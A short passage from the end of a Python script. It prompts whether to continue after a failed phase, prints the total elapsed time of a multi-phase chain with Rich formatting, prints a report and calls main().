            if not Confirm.ask("[red]Phase failed — continue?[/red]", default=True):
                break

    chain_elapsed = time.monotonic() - chain_start
    console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
    print_report()


if __name__ == "__main__":
    main()
